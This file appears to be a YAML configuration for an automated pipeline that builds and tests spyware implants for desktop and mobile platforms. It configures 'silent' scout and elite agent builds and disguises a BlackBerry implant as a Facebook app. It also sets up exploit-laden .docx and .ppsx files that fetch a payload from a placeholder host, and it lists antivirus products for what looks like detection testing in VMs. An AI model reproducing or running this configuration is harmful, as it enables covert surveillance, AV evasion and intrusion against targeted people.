SET_BUILD_PARAMS:
    - SET:
          build_parameters:
                android:
                  platform_type: mobile
                  binary: {admin: false, demo: true}
                  melt: {}
                  platform: android
                  sign: {}
                  package: {}
                blackberry:
                  platform_type: mobile
                  binary: {demo: true}
                  melt: {appname: facebook, desc: Applicazione utilissima di social network, name: Facebook
                      Application, vendor: face inc, version: 1.2.3}
                  package: {}
                  platform: blackberry
                exploit:
                  platform_type: desktop
                  deliver: {user: USERID}
                  factory: {_id: '000'}
                  generate:
                    binary: {admin: false, demo: false}
                    exploit: HT-2012-001
                    melt: {admin: false, demo: false, scout: true}
                    platforms: [windows]
                  melt: {appname: agent.exe, combo: txt, filename: example.txt, input: '000'}
                  platform: exploit
                  package: {}
                exploit_docx:
                  platform_type: desktop
                  deliver: {user: USERID}
                  factory: {_id: '000'}
                  generate:
                    binary: {admin: false, demo: false}
                    exploit: HT-2013-002
                    melt: {admin: false, demo: false, scout: true}
                    platforms: [windows]
                  melt: {appname: APPNAME, filename: example.docx, input: '000', url: 'http://HOSTNAME/APPNAME'}
                  platform: exploit
                  package: {}
                exploit_ppsx:
                  platform_type: desktop
                  deliver: {user: USERID}
                  factory: {_id: '000'}
                  generate:
                    binary: {admin: false, demo: false}
                    exploit: HT-2013-003
                    melt: {admin: false, demo: false, scout: true}
                    platforms: [windows]
                  melt: {appname: APPNAME, filename: example.ppsx, input: '000', url: 'http://HOSTNAME/APPNAME'}
                  platform: exploit
                  package: {}
                exploit_web:
                  platform_type: desktop
                  deliver: {user: USERID}
                  factory: {_id: '000'}
                  generate:
                    binary: {admin: false, demo: false}
                    exploit: HT-2013-002
                    melt: {admin: false, demo: false, scout: true}
                    platforms: [windows]
                  melt: {appname: APPNAME, filename: example.docx, input: '000', url: 'http://HOSTNAME/APPNAME'}
                  platform: exploit
                  package: {}
                ios:
                  platform_type: mobile
                  binary: {demo: true}
                  melt: {}
                  platform: ios
                  package: {type: local}
                linux:
                  platform_type: desktop
                  binary: {admin: false, demo: true}
                  melt: {}
                  platform: linux
                  package: {}
                osx:
                  platform_type: desktop
                  binary: {admin: true, demo: true}
                  melt: {}
                  platform: osx
                  package: {}
                windows:
                  platform_type: desktop
                  binary: {admin: false, demo: true}
                  melt: {admin: false, bit64: true, codec: true, scout: true}
                  platform: windows
                  sign: {}
                  package: {}

SET_BLACKLIST:
    - SET:
        blacklist: [bitdef,comodo,gdata,drweb,emsisoft,sophos,360cn,kis32,avg,avg32]

SET_DEFAULTS:
    - CALL: SET_BUILD_PARAMS
    - CALL: SET_BLACKLIST
    - SET:
        backend: 192.168.100.201
        frontend: 172.20.100.204
        redis: 10.0.20.1

UPLOAD_AGENT:
    - PUSH:
        - [AVAgent/av_agent.py, AVAgent/build.py, AVAgent/package.py, AVAgent/rcs_cient.py,
            AVCommon/commands/START_AGENT.py, AVCommon/commands/STOP_AGENT.py,
            AVCommon/commands/BUILD.py, AVCommon/commands/GET.py, AVCommon/commands/SET.py]
        - /home/avmonitor/AVTest
        - c:\\

UPDATE:
    - INTERNET: False
    - REVERT
    - SLEEP: [10, 180]
    - START_VM
    - SLEEP: 180
    #- CHECK_INFECTION
    - INTERNET: True
    - SLEEP: 3600
    - INTERNET: False
    - CALL: UPLOAD_AGENT
    - EXECUTE_VM: shutdown.bat
    #- CHECK_SHUTDOWN
    - START_VM
    - SLEEP: 180
    - STOP_VM
    - REFRESH_SNAPSHOT

DISPATCH:
    - REVERT
    - START_VM
    - UPDATE
    - PUSH: [ file.sh, anotherfile.sh ]

SCOUT:
    - CALL: DISPATCH
    - START_AGENT
    - CALL: SET_DEFAULTS
    - BUILD: [ scout, windows, silent ]
    - STOP_AGENT

MANUAL_BUILD:
    - START_AGENT
    - CALL: SET_DEFAULTS
    - BUILD: [ pull, windows, silent ]
    - STOP_AGENT

ELITE:
    - CALL: DISPATCH
    - START_AGENT
    - CALL: SET_DEFAULTS

    - BUILD: [ elite, windows, silent ]
    - STOP_AGENT

STATIC:
    - CALL: DISPATCH


TEST:
    - START_AGENT
    - CALL: SET_DEFAULTS
    - BUILD: [ pull, windows, silent ]
    - BUILD: [ pull, linux, silent ]
    - BUILD: [ pull, osx, silent ]
    - BUILD: [ pull, android, silent ]
    - BUILD: [ pull, blackberry, silent ]
    - BUILD: [ pull, ios, silent ]
    - STOP_AGENT